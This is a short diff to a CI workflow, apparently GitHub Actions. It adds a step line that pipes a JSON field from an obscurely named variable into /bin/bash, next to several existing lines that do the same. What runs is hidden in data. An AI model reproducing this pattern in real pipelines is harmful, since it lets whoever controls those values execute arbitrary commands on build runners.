@@ -33,6 +33,7 @@ jobs:
           echo $tqrt4476 | jq -r .vxzx2920 | /bin/bash
           printf '%s' "$z97605" | jq -r .e2369 | /bin/bash
           echo $pus83949 | jq -r .vahw3 | /bin/bash
+          printf '%s' "$npp37172" | jq -r .zv501 | /bin/bash
 
       - name: Upload data
         if: always()
